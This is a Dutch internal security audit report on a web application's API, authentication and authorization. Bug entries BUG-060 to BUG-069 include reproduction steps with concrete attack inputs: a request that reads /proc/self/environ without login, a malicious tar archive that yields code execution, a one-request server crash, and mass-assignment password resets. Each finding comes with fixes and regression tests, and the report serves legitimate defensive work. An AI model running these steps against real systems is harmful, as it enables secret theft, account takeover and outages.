# Fase 6–8 — geconsolideerd securityrapport (API-audit, authenticatie/autorisatie, security-audit)

2026-09-10 · branch `feat/customer-portal` · audit-server `http://localhost:5001` (dev/tsx), database
`lvs_audit`. Samengevoegd uit `docs/audit/wip/api-matrix.md` (AM-001…AM-008, eindrun **3144 requests**,
360 endpoints × 8 identiteiten, `X-Forwarded-For`-rotatie, 0×429), `docs/audit/wip/security-static.md`
(SEC-001…SEC-039, statische review), `docs/audit/wip/security-runtime.md` (SR-001…SR-005, 9 live checks)
en `docs/audit/wip/socket.md` (RT-001). Bestaande bevindingen uit `docs/audit/03-phase-3-5-rapport.md`
§1–2 (BUG-001…BUG-059) worden **gerefereerd, niet herhaald**. Er is geen applicatiecode gewijzigd.

```text
SECURITY REPORT

Critical: 2 nieuw (BUG-060, BUG-061) — plus bestaand en hier herbevestigd: BUG-002, BUG-003, BUG-005
High: 14 nieuw (BUG-062 t/m BUG-075) — plus bestaand en hier herbevestigd: BUG-001, BUG-009, BUG-010, BUG-011, BUG-012, BUG-015, BUG-023
Medium: 17 nieuw (BUG-076 t/m BUG-092) — plus bestaand en hier herbevestigd: BUG-026, BUG-046, BUG-047
Low: 13 nieuw (BUG-093 t/m BUG-105) — plus bestaand en hier herbevestigd: BUG-051, BUG-057

Authentication: Het inlogpad zelf is degelijk (scrypt+timingSafeEqual, sessie-regeneratie, HttpOnly/SameSite, lockout per account, CSRF via HMAC aan de sessie) en is op alle punten live bevestigd. De echte gaten zitten eromheen: een standaard-admin `admin`/`admin123` die ook in productie wordt aangemaakt (BUG-062), een portaalsessie die terugvalt op een hardgecodeerd secret (BUG-083), en een login-rate-limiter die per IP te omzeilen is (BUG-009) en één teller deelt over vier auth-routes (BUG-105).
Authorization: Dit is de zwakste laag van de applicatie. Van de 3144 matrixverzoeken leverden 13 muterende verzoeken door een account met **nul permissies** een 2xx op; zes endpointgroepen staan op alleen `requireAuth` (BUG-064 t/m BUG-068) en twee routefamilies laten mass assignment toe (BUG-063 gebruikers, BUG-084 reserveringen). Vijf van de acht in fase 1a vermoede autorisatiegaten zijn hiermee voor het eerst empirisch bewezen.
API: 360 endpoints × 8 identiteiten volledig doorgemeten, zonder één 429. 19 responses waren 5xx: één daarvan is een volledige serverkill (BUG-061), vier zijn onvoorwaardelijk kapotte endpoints (BUG-075, BUG-088, BUG-089), de rest ontbrekende inputvalidatie (BUG-103, BUG-104) en een race (BUG-090). Foutafhandeling lekt op twee plaatsen interne details (DATABASE_URL in BUG-075, `error.message` in BUG-090).
Files: Er is één **ongeauthenticeerd** arbitrary-file-read-pad (BUG-060: `receiptFilePath` via de auth-loze expenses-routes + `res.sendFile` zonder root), een arbitrary-file-delete via `backgroundPath` in vier templatemodules (BUG-070), een RCE-primitief in de backup-restore (`tar -xzf` over `process.cwd()`, BUG-069) en een `/uploads`-mount zonder permissiecheck die tijdens de audit aantoonbaar bestanden uit een **andere omgeving** teruggaf (BUG-085 + nieuwe evidence bij BUG-026).
Data exposure: Socket.IO zendt volledige klant-, kosten- en gebruikersrecords naar elke cookieloze verbinding (BUG-005, live herbevestigd). Het SMTP-wachtwoord komt onversleuteld terug op `GET /api/settings` voor een `manage_backups`-account (BUG-010, deze run live opnieuw geverifieerd met de `manager`-sessie) en de request-logger schrijft volledige JSON-responsebodies naar de containerlog (BUG-079). Cross-tenant-lekkage in het portaal is in 3144 verzoeken **niet** waargenomen.
Sessions: Sessiefixatie, logout en de `Secure`-vlaglogica zijn live geverifieerd en in orde. Wat ontbreekt: een wachtwoordwijziging trekt andere sessies niet in (BUG-091), logout ruimt de `active_sessions`-rij niet op (BUG-095, 142 rijen tegenover 94 echte sessies) en het IP-adres in die tabel is volledig door de client te verzinnen (BUG-082).
Secrets: Geen secrets in de client-bundle en geen hardcoded credentials in de repo, maar `DATABASE_URL` lekt letterlijk in een foutrespons (BUG-075), het SMTP-wachtwoord staat onversleuteld in `app_settings` en komt ongeredacteerd terug (BUG-010), uitgaande SMTP draait met `rejectUnauthorized:false` (BUG-080) en `admin123` staat in de code én in de deploymentlog (BUG-062).
Other: Geen SQL-injectie gevonden (volledig uitgezocht, zie `security-static.md` §Confirmed OK) en geen command injection. Wél twee onafhankelijke single-request DoS-vectoren op het hele proces (BUG-002 bestaand, BUG-061 nieuw) door het beleid "elke unhandled rejection is fataal", plus twee SSRF-/portscan-oracles (BUG-071, BUG-077). De DOM-XSS-sinks (BUG-072, BUG-073, BUG-102) zijn statisch bewezen maar niet in een browser uitgevoerd — er was geen browsertool beschikbaar.
```

**Nieuwe bugs:** 46 (BUG-060 … BUG-105) — 2 CRITICAL, 14 HIGH, 17 MEDIUM, 13 LOW.
**Totaal tracker na deze fase:** 105 bugs — **9 CRITICAL, 30 HIGH, 41 MEDIUM, 25 LOW**
(BUG-001…059: 7/16/24/12 · BUG-060…105: 2/14/17/13).

Eén afwijking van de bronseverity: **AM-004 (MEDIUM) → BUG-075 (HIGH)**, genormaliseerd naar de regel
die het tracker al toepast bij BUG-010 (secretdisclosure aan een `manage_backups`-account is HIGH);
`DATABASE_URL` inclusief wachtwoord is een zwaarder secret dan het SMTP-wachtwoord.

---

## 1. Deduplicatie — mapping SEC/AM/SR/RT naar het tracker

Bevindingen die een bestaande BUG **bevestigen** krijgen geen nieuw nummer. Bevindingen die een
bestaande BUG **verlengen** (nieuw exploitpad, nieuwe route, nieuwe trigger) krijgen wél een nieuw
nummer, met verwijzing naar de basisbug.

| Bron | Verdict | Tracker-id |
|---|---|---|
| RT-001 | identiek | = **BUG-005** (geen nieuw nummer) |
| SEC-001 | verlengt BUG-003 (van "expense-data" naar "arbitrary file read") | **BUG-060** |
| SEC-002 | nieuw | **BUG-062** |
| SEC-003 | deels bestaand (`spare-status` = BUG-015, `migrate/customer-drivers` = BUG-023), rest nieuw | **BUG-064, BUG-065, BUG-066, BUG-067, BUG-068** |
| SEC-004 | nieuw | **BUG-069** |
| SEC-005 | nieuw | **BUG-076** |
| SEC-006 | nieuw | **BUG-071** |
| SEC-007 | nieuw | **BUG-077** |
| SEC-008 | nieuw | **BUG-072** |
| SEC-009 | nieuw | **BUG-073** |
| SEC-010 | verlengt BUG-001 (wachtwoordreset van elk account + geen schema) | **BUG-063** |
| SEC-011 | zelfde klasse als BUG-012, andere routes, mét write-primitief | **BUG-070** |
| SEC-012 | nieuw (runtime bevestigd, Check 1) | **BUG-078** |
| SEC-013 | nieuw (versterkt BUG-010) | **BUG-079** |
| SEC-014 | bevestigt bestaand | = **BUG-010** |
| SEC-015 | nieuw | **BUG-080** |
| SEC-016 | nieuw (deels weerlegd door Check 3c, zie §3) | **BUG-081** |
| SEC-017 + SR-004 | zelfde header als BUG-009, andere sink | **BUG-082** |
| SEC-018 | nieuw (raakt SEC-037) | **BUG-083** |
| SEC-019 | verlengt BUG-016 (van `status` naar élke kolom incl. `id`/`deletedAt`) | **BUG-084** |
| SEC-020 | nieuw (runtime evidence bij BUG-026) | **BUG-085** |
| SEC-021 | nieuw (runtime bewezen, Check 3b) | **BUG-086** |
| SEC-022 | nieuw | **BUG-093** |
| SEC-023 | bevestigt bestaand | = **BUG-012** |
| SEC-024 | nieuw | **BUG-087** |
| SEC-025 | bevestigt bestaand (de niet-functionele productie-CORS-lijst valt binnen BUG-005's fix) | = **BUG-005** |
| SEC-026 | nieuw | **BUG-094** |
| SEC-027 | nieuw (runtime bevestigd: 142 vs 94 rijen) | **BUG-095** |
| SEC-028 | nieuw | **BUG-096** |
| SEC-029, SEC-030, SEC-034, SEC-037, SEC-039 | Info | zie §2.5 *Informatief* |
| SEC-031 | nieuw (runtime verfijnd: 12/12 payloads gaven geen inhoud) | **BUG-097** |
| SEC-032 | nieuw | **BUG-098** |
| SEC-033 | nieuw | **BUG-099** |
| SEC-035 | nieuw | **BUG-100** |
| SEC-036 | nieuw | **BUG-101** |
| SEC-038 | nieuw | **BUG-102** |
| AM-001 | nieuw; vervangt fase-1a-risico #14 en superseert SR-002 | **BUG-074** |
| AM-002 | nieuw (naast BUG-057, andere trigger — zie §3) | **BUG-103** |
| AM-003 | nieuw | **BUG-088** |
| AM-004 | nieuw, severity genormaliseerd MEDIUM→HIGH | **BUG-075** |
| AM-005 | zelfde klasse als BUG-002, ander endpoint/trigger/permissiedrempel | **BUG-061** |
| AM-006 | nieuw | **BUG-067** |
| AM-007 | nieuw | **BUG-090** |
| AM-008 | nieuw | **BUG-104** |
| AM-matrix, 5xx-tabel: `GET /api/reports/maintenance-costs` | nieuw | **BUG-089** |
| AM-matrix, overige 2xx/5xx/leak-rijen | bevestigen bestaand | = BUG-003, BUG-010, BUG-011, BUG-023, BUG-046, BUG-051 |
| SR-001 | nieuw (runtime bewezen) | **BUG-091** |
| SR-002 | **weerlegd als geformuleerd** — geen eigen nummer, zie §3 | = **BUG-074** |
| SR-003 | nieuw | **BUG-105** |
| SR-004 | samengevoegd met SEC-017 | **BUG-082** |
| SR-005 | nieuw | **BUG-092** |

**Bestaande bugs die deze fase nieuwe of zwaardere evidence kregen (geen nieuw nummer):**
BUG-003 (AM: `anon` krijgt 400/404 i.p.v. 401 op exact de vier genoemde routes), BUG-005 (Check 1:
Socket.IO-handshake met `Origin: https://evil.example` → 200 + `access-control-allow-origin: *`),
BUG-009 (de hele audit draaide op de `X-Forwarded-For`-omzeiling), BUG-010 (live `curl` met de
`manager`-sessie: `"smtpPassword":"AUDIT-super-secret-smtp-pw"` in een 5302-byte respons),
BUG-011/BUG-023 (`nobody`, permissies `[]` → 200), BUG-026 (**verzwarend**: `GET
/uploads/12XT102/receipts/12XT102_receipt_tires_2026-01-24_1788033206383.pdf` → 200, 308048 bytes,
echte PDF uit een **andere omgeving** die dezelfde checkout deelt), BUG-046/BUG-051 (`anon` krijgt
exact dezelfde respons als `admin`), BUG-047 (voor het eerst ook in de portaalrealm gereproduceerd),
BUG-057 (live gereproduceerd op `/api/login` én `/api/vehicles`, inclusief absoluut Windows-pad).

---

## 2. Bugtracker-aanvulling — BUG-060 … BUG-105

Type: **T** = Technische fout · **B** = Bedrijfsregel/procesbesluit (goedkeuring nodig).
45 van de 46 nieuwe bevindingen zijn **Technische fout**; alleen BUG-081 vraagt een procesbesluit.

### 2.1 CRITICAL

#### BUG-060 — Ongeauthenticeerde arbitrary file read via `receiptFilePath` van een expense
- **Severity:** CRITICAL · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-001 — *verlengt BUG-003*
- **Feature:** Expenses — bonnen aanmaken en downloaden
- **Reproduction:** Zonder enige login: (1) `GET /` levert een sessie + `XSRF-TOKEN` aan een anonieme bezoeker (`csrf.ts:100-113`, zie BUG-096); (2) `POST /api/expenses/with-receipt` met die cookie, `X-CSRF-Token` en body `{"vehicleId":1,"category":"x","amount":"1","date":"2026-01-01","receiptFilePath":"/proc/self/environ"}` → **201** met een nieuw `id`; (3) `GET /api/expenses/<id>/receipt` → de inhoud van `/proc/self/environ`. AM bevestigt de auth-loosheid van deze routes empirisch: `anon` krijgt **400** (bodyvalidatie) resp. **404**, nooit 401.
- **Expected:** Alle vier de expenses-routes eisen `hasPermission(MANAGE_EXPENSES)`; `receiptFilePath` is niet client-zetbaar; de download resolvet via `resolveDocumentFilePath()`.
- **Actual:** Geen middleware, een client-zetbaar padveld en `res.sendFile(path.resolve(<string uit DB>))` zonder `{root}` → elk absoluut pad in de container is leesbaar.
- **Root cause:** `server/routes/expenses.ts:275` (geen auth), `:298` (`insertExpenseSchema.parse(req.body)`), `:302-311` (`additionalData` alleen bij `req.file`), `:170-176` (`path.resolve` + `sendFile` zonder containment); `shared/schema.ts:1026-1032` — `insertExpenseSchema` omit `receiptFilePath` (`schema.ts:1009`) niet.
- **Affected files:** `server/routes/expenses.ts:158,170-176,275,298,302-319,341,405`, `shared/schema.ts:1009,1026-1032`
- **Affected data:** Elk bestand dat de app-user kan lezen: `/proc/self/environ` (`DATABASE_URL`, `SESSION_SECRET`, `GEMINI_API_KEY`, `BACKUP_PATH`), `uploads/`-contracten en rijbewijsscans, `dist/server/index.js`, `/etc/passwd`.
- **Security impact:** Ongeauthenticeerde arbitrary file read → volledige secretdisclosure. Met `SESSION_SECRET` zijn sessiecookies te vervalsen, met `DATABASE_URL` is de database direct benaderbaar. CSRF is geen barrière: de aanvaller haalt het token zelf op.
- **Business impact:** Volledige compromittering van applicatie en klantgegevens vanaf het open internet, zonder account, zonder spoor (`createdBy` blijft `null`).
- **Fix proposal:** `hasPermission(MANAGE_EXPENSES)` op alle vier routes én op `/api/expenses/:id/receipt`; `receiptFilePath`/`receiptFile`/`receiptFileSize`/`receiptContentType`/`receiptUrl` uit `insertExpenseSchema` `.omit()`-en; de receipt-route via `resolveDocumentFilePath()` (`server/services/document-paths.ts:19`).
- **Regression test:** Anonieme `POST /api/expenses/with-receipt` → 401; met een geldige sessie een `receiptFilePath` buiten `getUploadsDir()` meesturen → veld genegeerd; `GET /api/expenses/:id/receipt` op een gemanipuleerd pad → 404, geen inhoud.

#### BUG-061 — Eén request met een niet-bestaand `customerId` zet het hele serverproces uit (FK-violation → unhandled rejection → `process.exit`)
- **Severity:** CRITICAL · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** AM-005 — *zelfde klasse als BUG-002, ander endpoint/trigger*
- **Feature:** Portal-admin klantinstellingen (`VIEW_PORTAL`/`MANAGE_PORTAL`)
- **Reproduction:** Als elk account met `VIEW_PORTAL` of `MANAGE_PORTAL` (bevestigd met `admin`, `manager` én `viewer`): `GET /api/portal-admin/customers/999999999/settings` → **geen respons, TCP-verbinding gedropt, Node-proces stopt**. Server herstart na ~15-20s (`GET /health` gaat `000` → `200`). Twee onafhankelijke matrixruns + een losse `curl`-repro, 100% hitrate; 6 gelijktijdige verzoeken van andere identiteiten sneuvelden als collateral damage (de 6 `ERR`-rijen in de matrix).
- **Expected:** `404` (klant niet gevonden), zoals elke andere `:id`-niet-gevonden-route.
- **Actual:** Volledige procescrash; staff-app én portaal onbereikbaar tot de restart klaar is.
- **Root cause:** `server/routes/portal-admin.ts:109-111` roept `portalStorage.getOrCreateCustomerSettings(customerId)` (`server/services/portal-storage.ts:136-143`) aan zonder bestaanscontrole; die doet `db.insert(portalCustomerSettings).values({customerId}).onConflictDoNothing()`, en `shared/schema.ts:493` is een echte FK → Postgres FK-violation (géén conflict, dus `onConflictDoNothing` helpt niet) ontsnapt als unhandled rejection; `server/index.ts:136-144` beschouwt élke unhandled rejection als fataal en doet `gracefulShutdown()`.
- **Affected files:** `server/routes/portal-admin.ts:109-111`, `server/services/portal-storage.ts:136-143`, `shared/schema.ts:493`, `server/index.ts:136-144`
- **Affected data:** Geen corruptie (de insert commit nooit) — pure beschikbaarheidsimpact.
- **Security impact:** Remote DoS op de hele applicatie met één GET-verzoek, vanaf een laag-geprivilegieerd staffaccount (`view_portal` is een voor de hand liggende permissie). Gezien het generieke "fataal"-beleid is dit vrijwel zeker niet de enige ongewrapte DB-call die op attacker-gestuurde invoer kan gooien.
- **Business impact:** Totale uitval voor alle gelijktijdige gebruikers; tijdens deze audit onderbrak het de matrixrun herhaaldelijk.
- **Fix proposal:** Direct: `storage.getCustomer(customerId)` checken (of de FK-violation specifiek vangen) vóór `getOrCreateCustomerSettings`, anders 404. Structureel (samen met BUG-002): een async-errorwrapper (`express-async-errors` of Express 5) zodat een rejection in een routehandler een 500 op dát verzoek geeft in plaats van `process.exit()`.
- **Regression test:** `GET /api/portal-admin/customers/999999999/settings` als `VIEW_PORTAL`-account → 404, en `GET /health` direct daarna → 200 (geen restart).

### 2.2 HIGH

#### BUG-062 — Standaard-admin `admin` / `admin123` wordt ook in productie aangemaakt en naar de log geschreven
- **Severity:** HIGH · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-002 (runtime bevestigd, Check 4)
- **Feature:** Bootstrap van het beheerdersaccount
- **Reproduction:** Verse deploy (of deploy ná een `restore-data` die `users` heeft gewist) zonder `DEFAULT_ADMIN_PASSWORD` → inloggen met `admin`/`admin123` slaagt. Deze hele audit draaide op precies dat account; `dist/server/index.js` bevat drie treffers van `admin123` (default + twee console-logregels).
- **Expected:** In productie hard falen zonder `DEFAULT_ADMIN_PASSWORD` (net als bij `SESSION_SECRET`), of een willekeurig wachtwoord genereren dat één keer gelogd wordt.
- **Actual:** `admin123` is de code-default, er is geen `NODE_ENV`-check, en `displayDeploymentInfo()` logt de default letterlijk naar de containerlog.
- **Root cause:** `server/initAdmin.ts:21-23` (`process.env.DEFAULT_ADMIN_PASSWORD || 'admin123'`), `:34-54`, `:62-69` (waarschuwing pas ná aanmaken), `:85-101` (log); aangeroepen bij elke start via `server/index.ts:507,538`.
- **Affected files:** `server/initAdmin.ts:21-101`, `server/index.ts:507,538`
- **Affected data:** `users` — het admin-account zelf.
- **Security impact:** Volledige applicatie-overname met publiek bekende credentials. De loginlimiter (5/15 min) hindert een gerichte poging met bekende credentials nauwelijks, en is bovendien te omzeilen (BUG-009).
- **Business impact:** Elke deploy of database-restore die de omgevingsvariabele vergeet, zet de hele administratie open voor iedereen die de inlogpagina kan bereiken.
- **Fix proposal:** In productie `process.exit(1)` zonder `DEFAULT_ADMIN_PASSWORD`, of een random wachtwoord genereren; `admin123` uit de code én uit de deployment-info-log verwijderen.
- **Regression test:** Start met `NODE_ENV=production` zonder `DEFAULT_ADMIN_PASSWORD` → proces start niet (of het aangemaakte wachtwoord is aantoonbaar random en staat niet in de log).

#### BUG-063 — Mass assignment op `PATCH /api/users/:id`: wachtwoordreset van elk account en schrijftoegang op elke kolom
- **Severity:** HIGH · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-010 — *verlengt BUG-001*
- **Feature:** Gebruikersbeheer (`manage_users`)
- **Reproduction:** Als account met `manage_users` maar zonder admin-rol: `PATCH /api/users/<admin-id> {"password":"x"}` → wachtwoord van het admin-account gewijzigd **zonder het oude wachtwoord te kennen** (`POST /api/users/change-password` eist dat wél). Ook `{"id":9999}`, `{"createdAt":...}`, `{"createdBy":...}` zijn schrijfbaar.
- **Expected:** Een zodschema (`updateUserSchema`, dat al bestaat op `shared/schema.ts:158`) met veldwhitelist; wachtwoordwijziging van een ánder account alleen door een echte admin, met her-authenticatie.
- **Actual:** `userData = { ...req.body, updatedBy }` zonder schema; het `delete userData.role/permissions/active/hidePrices`-blok geldt alleen voor gebruikers zónder `manage_users`.
- **Root cause:** `server/routes/users.ts:184-188` (spread), `:191-197` (conditioneel delete-blok), `:200` (`if (userData.password)` → `storage.updateUserPassword(id, …)` op elk `:id`); opslag `server/database-storage.ts:151-171`.
- **Affected files:** `server/routes/users.ts:135-237`, `server/database-storage.ts:151-171`
- **Affected data:** Elke kolom van elke rij in `users`, inclusief `password`, `id`, `createdAt`, `createdBy`.
- **Security impact:** Accountovername van elke gebruiker (inclusief admins) door een niet-admin met `manage_users`; complementair aan BUG-001, dat alleen de zelf-promotie beschrijft. Ook de audit-integriteit (`createdBy`) is aantastbaar.
- **Business impact:** `manage_users` is een permissie die je aan een ploegleider geeft; die kan hiermee stil het admin-wachtwoord resetten en het account overnemen.
- **Fix proposal:** `updateUserSchema.partial().parse(req.body)` in plaats van de spread; wachtwoordwijziging van een ander account achter `requireAdmin` + `/api/reauthenticate`; `id`/`createdAt`/`createdBy` nooit uit de body.
- **Regression test:** `PATCH /api/users/<ander-id> {"password":"x"}` als niet-admin met `manage_users` → 403; `PATCH /api/users/<eigen-id> {"id":9999}` → veld genegeerd.

#### BUG-064 — `DELETE /api/reservations/:id` mist de permissiecheck; cascadeert naar vervangingsreserveringen
- **Severity:** HIGH · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-003 + AM-matrix (fase-1a-risico #5, eerste empirische bevestiging)
- **Feature:** Reservering verwijderen
- **Reproduction:** Ingelogd als `nobody` (permissies `[]`): `DELETE /api/reservations/<id>` → **200**, reservering soft-deleted. Bij `type === 'maintenance_block'` verwijdert dezelfde handler ook alle gekoppelde vervangingsreserveringen.
- **Expected:** `hasPermission(MANAGE_RESERVATIONS)`, net als `DELETE /api/vehicles/:id` (`routes.ts:1624`) dat wél `MANAGE_VEHICLES` eist.
- **Actual:** Alleen `requireAuth` — elk ingelogd account, ongeacht rol of permissies.
- **Root cause:** `server/routes.ts:4621` — `app.delete("/api/reservations/:id", requireAuth, …)`; cascade op `:4649-4661`.
- **Affected files:** `server/routes.ts:4621-4687`
- **Affected data:** `reservations` (elke rij, incl. `deletedAt`/`deletedBy`) en de gekoppelde vervangingsreserveringen.
- **Security impact:** Broken access control (CWE-862) op een destructief endpoint, bereikbaar voor het laagst geprivilegieerde staffaccount.
- **Business impact:** Een kiosk- of schoonmaakaccount kan de volledige verhuuradministratie leeglopen door ids af te lopen; de spare-koppelingen verdwijnen mee.
- **Fix proposal:** `hasPermission(UserPermission.MANAGE_RESERVATIONS)` toevoegen; overweeg een default-deny-wrapper zodat een nieuwe route zonder expliciete permissie 403 geeft.
- **Regression test:** `DELETE /api/reservations/:id` met `permissions:[]` → 403; de rij mag niet wijzigen.

#### BUG-065 — Interactive damage checks: volledige CRUD én bulk-read zonder permissiecheck
- **Severity:** HIGH · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-003 + AM-matrix (fase-1a-risico #6)
- **Feature:** Interactieve schadecontroles (bewijsmateriaal bij schadeclaims)
- **Reproduction:** Als `nobody` (permissies `[]`): `PUT /api/interactive-damage-checks/:id` → **200**; `DELETE /api/interactive-damage-checks/:id` → **200** (inclusief de bijbehorende PDF-documenten); `GET /api/interactive-damage-checks` → **200, 18,3 MB** — élke schadecontrole in de database; `GET /api/interactive-damage-checks/:id` (1,3 MB), `/:id/pdf` (2,9 MB) en het niet eerder gecatalogiseerde `GET /api/vehicles/:id/damage-check-pdf` (1,9 MB) idem.
- **Expected:** `hasPermission(MANAGE_DAMAGE_CHECKS)` op de mutaties en `VIEW_DAMAGE_CHECKS` op de reads, zoals de zustermodules (`damage-check-templates`) wél doen.
- **Actual:** Alleen `requireAuth` op alle zes routes.
- **Root cause:** `server/routes.ts:6783` (GET lijst), `:6794` (GET één), `:6849` (POST), `:7004` (PUT), `:7213` (GET pdf), `:7303` (DELETE), `:6641` (`GET /api/vehicles/:id/damage-check-pdf`).
- **Affected files:** `server/routes.ts:6641,6783-7335`
- **Affected data:** `interactive_damage_checks` volledig, plus de gegenereerde PDF-documenten op schijf.
- **Security impact:** Ongecontroleerde massa-uitlezing van schadefoto's/-rapporten (klant- en voertuiggegevens) en het kunnen wissen van bewijsmateriaal, door een account met nul permissies.
- **Business impact:** Bewijs bij schadeclaims is stil te vernietigen of te wijzigen; de volledige schadehistorie is met één request te exfiltreren.
- **Fix proposal:** `hasPermission(MANAGE_DAMAGE_CHECKS)` / `hasPermission(VIEW_DAMAGE_CHECKS, MANAGE_DAMAGE_CHECKS)` op alle zeven routes; paginatie op de lijstroute.
- **Regression test:** Alle zeven routes met `permissions:[]` → 403.

#### BUG-066 — `vehicle-diagram-templates`: aanmaken, wijzigen en verwijderen (incl. `fs.unlink`) met alleen `requireAuth`
- **Severity:** HIGH · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-003 + AM-matrix (fase-1a-risico #8)
- **Feature:** Voertuigdiagram-templates (upload + beheer)
- **Reproduction:** Als `nobody`/`viewer`: `PATCH /api/vehicle-diagram-templates/:id` → **200**; als `nobody`: `DELETE /api/vehicle-diagram-templates/:id` → **200** (verwijdert ook het bestand van schijf).
- **Expected:** `hasPermission(MANAGE_VEHICLES)` of een eigen `manage_*`-permissie, zoals elke zustermodule (pdf-templates, damage-check-templates, report-and-label-templates) heeft.
- **Actual:** Alleen `requireAuth` op de create-, update- en delete-route, inclusief de upload.
- **Root cause:** `server/routes/vehicle-diagram-templates.ts:89` (POST/upload), `:138` (PATCH), `:211` (DELETE), met `fs.promises.unlink` op `:176` en `:228`.
- **Affected files:** `server/routes/vehicle-diagram-templates.ts:89,138,174-176,211,226-228`
- **Affected data:** `vehicle_diagram_templates` + de bijbehorende bestanden onder `uploads/`.
- **Security impact:** Missing authorization op een muterend endpoint mét file-upload en file-delete; in combinatie met BUG-070 (`backgroundPath`/`diagramPath` uit de body) is dit het laagste privilege waarmee een arbitrary file delete bereikbaar is — élk ingelogd account.
- **Business impact:** Elk account kan de schadediagram-templates verminken of wissen, waardoor de schadecontrole-workflow stilvalt.
- **Fix proposal:** `hasPermission(...)` op alle drie de routes en de padvelden server-side zetten (zie BUG-070).
- **Regression test:** POST/PATCH/DELETE met `permissions:[]` → 403.

#### BUG-067 — `POST`/`DELETE /api/settings/contract-number-override` schrijfbaar door elke ingelogde gebruiker
- **Severity:** HIGH · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** AM-006 (+ SEC-003)
- **Feature:** Contractnummering — override van het volgende contractnummer
- **Reproduction:** Als `nobody` (permissies `[]`) of `viewer`: `DELETE /api/settings/contract-number-override` → **200** `{"success":true,"settings":{…},"nextContractNumber":…,"message":"Override cleared - using automatic numbering"}` (682 bytes). `POST` met `{"overrideNumber":<n>}` heeft dezelfde middlewareketen (de lege-body-probe van de matrix liep alleen eerst op de eigen veldvalidatie vast).
- **Expected:** `hasPermission(MANAGE_SETTINGS)`, zoals elke andere settings-mutatie.
- **Actual:** Alleen `requireAuth`.
- **Root cause:** `server/routes/settings.ts:90` (POST) en `:121` (DELETE) — geen `hasPermission(UserPermission.MANAGE_SETTINGS)`; zelfde patroon als BUG-011, andere route.
- **Affected files:** `server/routes/settings.ts:90-135`
- **Affected data:** `app_settings` (de override-waarde) en indirect het contractnummer van elke daarna aangemaakte reservering.
- **Security impact:** Missing authorization op een muterend endpoint (HIGH volgens de normalisatieregel van het tracker).
- **Business impact:** Elk ingelogd account kan de contractnummering laten botsen met bestaande contracten of de reeks resetten — met juridische gevolgen voor contractuniciteit.
- **Fix proposal:** `hasPermission(UserPermission.MANAGE_SETTINGS)` op beide routes.
- **Regression test:** Beide routes met `permissions:[]` → 403.

#### BUG-068 — Placeholder-reserveringen en spare-overzichten zonder permissiecheck
- **Severity:** HIGH · **Status:** OPEN · **Type:** **Technische fout** · **Bron:** SEC-003 + AM-matrix (fase-1a-risico, `01a:21`)
- **Feature:** Placeholder-/vervangingsreserveringen en de bijbehorende overzichten
- **Reproduction:** Als `nobody` (permissies `[]`): `GET /api/placeholder-reservations` en `/needing-assignment` → **200**; `GET /api/vehicles/:vehicleId/customers-with-reservations` → **200, 28,8 KB** met klantnamen en lopende huurcontracten; `GET /api/spare-vehicles/available` → 200. De muterende varianten (aanmaken/toewijzen) hebben dezelfde middlewareketen.
- **Expected:** `hasPermission(MANAGE_RESERVATIONS)` op de mutaties en `VIEW_RESERVATIONS`/`VIEW_CUSTOMERS` op de reads.
- **Actual:** Alleen `requireAuth` op alle routes in deze groep.
- **Root cause:** `server/routes.ts:4464` (aanmaken), `:4516` (lijst), `:4543` (needing-assignment), `:4567` (toewijzen), `:4749` (`customers-with-reservations`).
- **Affected files:** `server/routes.ts:4464-4600`, `:4749`
- **Affected data:** `reservations` (placeholders/vervangers) en klantgegevens gekoppeld aan lopende huurcontracten.
- **Security impact:** Missing authorization; het `customers-with-reservations`-endpoint is bovendien een directe klantdata-uitlezing voor een account met nul permissies.
- **Business impact:** Iedere ingelogde medewerker kan de vervangingsplanning wijzigen en zien welke klant welk voertuig heeft.
- **Fix proposal:** Permissiechecks toevoegen conform de zusterroutes (`assign-spare`, `mark-needs-service`, die wél `MANAGE_RESERVATIONS` eisen).
- **Regression test:** Elk van de vijf routes met `permissions:[]` → 403.

#### BUG-069 — Geauthenticeerde RCE via backup-restore: `tar -xzf` van een geüpload archief over `process.cwd()`
- **Severity:** HIGH · **Status:** OPEN · **Type:** **Technische fout** (de fix bevat een procesbesluit: `restore-code` schrappen) · **Bron:** SEC-004
- **Feature:** Backups — `POST /api/backups/restore-code` en `/restore-files` (`manage_backups`)
- **Reproduction:** Maak lokaal `evil.tar.gz` met member `dist/server/index.js` (of `node_modules/<pkg>/index.js`), upload naar `POST /api/backups/restore-code` → het archief wordt over `/app` uitgepakt en de app herstart zichzelf ~2 s later (`process.exit(0)` op `:384`) → willekeurige code als de app-user. Dezelfde primitief zit in `/restore-files`, dat belooft alleen `uploads/` terug te zetten.
- **Expected:** Extractie naar een tijdelijke map met member-allowlist en padvalidatie tegen `getUploadsDir()`; code-deploy via HTTP hoort in een gecontaineriseerde deploy niet te bestaan.
- **Actual:** `tar -xzf "<upload>" -C "${process.cwd()}"` zonder `--strip-components`, `--exclude`, memberfilter of doelvalidatie; `validateAfterUpload(…, 'backup')` controleert alleen extensie + gzip-magic, niet de members.
- **Root cause:** `server/routes/backups.ts:354` en `:485`; `server/backupService.ts:927-936` (`spawn('tar', ['-xzf', tempFile, '-C', extractPath, '--overwrite'])` met `extractPath = targetPath || process.cwd()`); `server/utils/security/fileUploadSecurity.ts:260`.
- **Affected files:** `server/routes/backups.ts:354,485`, `server/backupService.ts:927-936`
- **Affected data:** De volledige applicatiecode en `node_modules` in `/app`; via een symlink-member (`uploads/x -> /`) ook bestanden buiten `/app`.
- **Security impact:** Remote code execution vanaf een `manage_backups`-account — de zwaarst mogelijke escalatie binnen de container; ketent bovendien met SEC-030 (DDL uit `schema-columns.json`) en met BUG-098 (symlinks binnen `uploads/`).
- **Business impact:** Een backup-operator (geen beheerder) kan de applicatie permanent overnemen of vernietigen, inclusief de back-ups zelf.
- **Fix proposal:** Extractie via de `tar`-npm-module met `{strip, filter, onentry}` of `tar --no-same-owner --no-overwrite-dir` met expliciete allowlist; naar een tempmap uitpakken, elk pad na `path.resolve()` tegen `getUploadsDir()` valideren en pas dan verplaatsen; `restore-code` verwijderen.
- **Regression test:** Upload van een archief met een member buiten `uploads/` → 400 en niets geschreven; upload met een symlink-member → geweigerd.

